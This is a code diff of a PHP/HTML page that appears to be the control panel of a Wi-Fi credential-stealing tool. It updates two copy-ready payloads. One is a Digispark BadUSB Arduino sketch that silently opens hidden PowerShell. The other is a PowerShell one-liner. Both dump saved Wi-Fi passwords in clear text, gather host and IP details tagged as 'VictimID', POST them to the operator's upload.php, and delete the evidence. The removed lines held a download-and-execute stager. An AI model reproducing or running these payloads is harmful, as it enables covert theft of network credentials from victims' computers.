@@ -1013,36 +1013,91 @@ $uniqueSSIDs   = count(array_unique(array_column($deduped, 'ssid')));
 
       <div style="margin-bottom:18px;">
         <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:6px;">
-          <span style="font-size:12px;font-weight:700;color:#64748b;text-transform:uppercase;">1. Digispark (Arduino IDE C++ Code — Fits Digispark RAM)</span>
+          <span style="font-size:12px;font-weight:700;color:#64748b;text-transform:uppercase;">1. Digispark (Original Arduino .ino Code)</span>
           <button type="button" onclick="copyCode('digiCode')" style="background:rgba(255,255,255,0.06);border:1px solid rgba(255,255,255,0.1);color:#38bdf8;padding:4px 10px;border-radius:6px;font-size:11px;font-weight:600;cursor:pointer;">📋 Copy Arduino Code</button>
         </div>
         <pre id="digiCode" style="font-family:'JetBrains Mono',monospace;font-size:12px;background:#020617;border:1px solid rgba(255,255,255,0.08);border-radius:10px;padding:14px;color:#cbd5e1;overflow-x:auto;white-space:pre-wrap;">#include "DigiKeyboard.h"
 
-void setup() {}
+#define KEY_R 0x15
+
+void setup() {
+  pinMode(1, OUTPUT); // onboard LED
+}
 
 void loop() {
   DigiKeyboard.sendKeyStroke(0);
-  DigiKeyboard.delay(1000);
+  DigiKeyboard.delay(2000);
 
-  // Win + R (Run Dialog)
+  // Open Run dialog
   DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
   DigiKeyboard.delay(600);
 
-  // Stager runs payload silently in background and immediately closes
-  DigiKeyboard.print(F("powershell -w hidden -nop -c \"[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;irm <?php echo $proto . '://' . $host; ?>/s.php?t=<?php echo urlencode($currentUser); ?>|iex\""));
-  DigiKeyboard.delay(400);
-  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  // Launch PowerShell (hidden)
+  DigiKeyboard.println("powershell -w hidden -NoLogo -NoProfile -ExecutionPolicy Bypass");
+  DigiKeyboard.delay(1800);
 
-  for(;;) { DigiKeyboard.delay(5000); }
+  // Wi-Fi grab + victim ID + LAN IP + location + CSV + POST + cleanup + exit
+  DigiKeyboard.print(
+    F(
+      "$u='<?php echo $proto . '://' . $host; ?>/upload.php?token=<?php echo urlencode($currentUser); ?>';"
+      "$t=$env:TEMP;"
+      "netsh wlan export profile folder=\"$t\" key=clear > $null;"
+      "$os=(Get-CimInstance Win32_OperatingSystem).Caption;"
+      "$victimId=$env:COMPUTERNAME;"
+      "try{$pub=(Invoke-WebRequest -UseBasicParsing 'https://api.ipify.org' -TimeoutSec 3).Content.Trim()}catch{$pub='(unknown)'};"
+      "$defaultRoute=Get-NetRoute -DestinationPrefix '0.0.0.0/0' -ErrorAction SilentlyContinue|Sort-Object RouteMetric|Select-Object -First 1;"
+      "if($defaultRoute){$ifIndex=$defaultRoute.InterfaceIndex;$lanObj=Get-NetIPAddress -AddressFamily IPv4 -InterfaceIndex $ifIndex -ErrorAction SilentlyContinue|Where-Object{ $_.IPAddress -notlike '169.254*' -and $_.IPAddress -notlike '127.0.0.1'}|Select-Object -First 1}else{$lanObj=$null};"
+      "if($lanObj){$lan=$lanObj.IPAddress}else{$lan='(unknown)'};"
+      "$alt='N/A';$lat='N/A';$lon='N/A';"
+      "$ts=(Get-Date -f 'yyyy-MM-dd HH:mm:ss');"
+      "$items=@();"
+      "Get-ChildItem \"$t\\Wi-Fi-*.xml\"|ForEach-Object{"
+        "$x=[xml](Get-Content $_.FullName);"
+        "$s=$x.WLANProfile.SSIDConfig.SSID.name;"
+        "$p=$x.WLANProfile.MSM.security.sharedKey.keyMaterial;"
+        "$items+=[pscustomobject]@{"
+          "Time=$ts;"
+          "VictimID=$victimId;"
+          "SSID=$s;"
+          "Password=if($p){$p}else{''};"
+          "VictimLANIP=$lan;"
+          "VictimOS=$os;"
+          "PublicIP=$pub;"
+          "LANExtra=$alt;"
+          "Latitude=$lat;"
+          "Longitude=$lon;"
+          "PacketSummary=''"
+        "};"
+        "Remove-Item $_.FullName -ErrorAction SilentlyContinue"
+      "};"
+      "if($items){"
+        "$csv=\"$t\\w.csv\";"
+        "$items|Export-Csv $csv -NoTypeInformation;"
+        "Invoke-WebRequest -UseBasicParsing -Uri $u -Method Post -Body (Get-Content $csv -Raw);"
+        "Remove-Item $csv -ErrorAction SilentlyContinue;"
+      "};"
+      "exit;"
+    )
+  );
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(3000);
+
+  // Blink LED to confirm completion
+  while (true) {
+    digitalWrite(1, HIGH);
+    DigiKeyboard.delay(200);
+    digitalWrite(1, LOW);
+    DigiKeyboard.delay(200);
+  }
 }</pre>
       </div>
 
       <div style="margin-bottom:18px;">
         <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:6px;">
-          <span style="font-size:12px;font-weight:700;color:#64748b;text-transform:uppercase;">2. Instant PowerShell Command (Bulletproof Encoded)</span>
-          <button type="button" onclick="copyCode('psOneLiner')" style="background:rgba(255,255,255,0.06);border:1px solid rgba(255,255,255,0.1);color:#38bdf8;padding:4px 10px;border-radius:6px;font-size:11px;font-weight:600;cursor:pointer;">📋 Copy PowerShell</button>
+          <span style="font-size:12px;font-weight:700;color:#64748b;text-transform:uppercase;">2. Direct PowerShell Command (Paste into PowerShell)</span>
+          <button type="button" onclick="copyCode('psOneLiner')" style="background:rgba(255,255,255,0.06);border:1px solid rgba(255,255,255,0.1);color:#38bdf8;padding:4px 10px;border-radius:6px;font-size:11px;font-weight:600;cursor:pointer;">📋 Copy Command</button>
         </div>
-        <pre id="psOneLiner" style="font-family:'JetBrains Mono',monospace;font-size:12px;background:#020617;border:1px solid rgba(255,255,255,0.08);border-radius:10px;padding:12px;color:#38bdf8;overflow-x:auto;white-space:pre-wrap;">powershell -w hidden -ep bypass -nop -enc <?php echo $b64Enc; ?></pre>
+        <pre id="psOneLiner" style="font-family:'JetBrains Mono',monospace;font-size:12px;background:#020617;border:1px solid rgba(255,255,255,0.08);border-radius:10px;padding:12px;color:#38bdf8;overflow-x:auto;white-space:pre-wrap;">&amp; { $u='<?php echo $proto . '://' . $host; ?>/upload.php?token=<?php echo urlencode($currentUser); ?>'; $t=$env:TEMP; netsh wlan export profile folder="$t" key=clear > $null; $os=(Get-CimInstance Win32_OperatingSystem).Caption; $victimId=$env:COMPUTERNAME; try{$pub=(Invoke-WebRequest -UseBasicParsing 'https://api.ipify.org' -TimeoutSec 3).Content.Trim()}catch{$pub='(unknown)'}; $defaultRoute=Get-NetRoute -DestinationPrefix '0.0.0.0/0' -ErrorAction SilentlyContinue|Sort-Object RouteMetric|Select-Object -First 1; if($defaultRoute){$ifIndex=$defaultRoute.InterfaceIndex;$lanObj=Get-NetIPAddress -AddressFamily IPv4 -InterfaceIndex $ifIndex -ErrorAction SilentlyContinue|Where-Object{ $_.IPAddress -notlike '169.254*' -and $_.IPAddress -notlike '127.0.0.1'}|Select-Object -First 1}else{$lanObj=$null}; if($lanObj){$lan=$lanObj.IPAddress}else{$lan='(unknown)'}; $ts=(Get-Date -f 'yyyy-MM-dd HH:mm:ss'); $items=@(); Get-ChildItem "$t\Wi-Fi-*.xml"|ForEach-Object{ $x=[xml](Get-Content $_.FullName); $s=$x.WLANProfile.SSIDConfig.SSID.name; $p=$x.WLANProfile.MSM.security.sharedKey.keyMaterial; $items+=[pscustomobject]@{ Time=$ts; VictimID=$victimId; SSID=$s; Password=if($p){$p}else{''}; VictimLANIP=$lan; VictimOS=$os; PublicIP=$pub; LANExtra='N/A'; Latitude='N/A'; Longitude='N/A'; PacketSummary='' }; Remove-Item $_.FullName -ErrorAction SilentlyContinue }; if($items){ $csv="$t\w.csv"; $items|Export-Csv $csv -NoTypeInformation; Invoke-WebRequest -UseBasicParsing -Uri $u -Method Post -Body (Get-Content $csv -Raw); Remove-Item $csv -ErrorAction SilentlyContinue }; exit }</pre>
       </div>
 
       <div style="display:flex;justify-content:flex-end;">
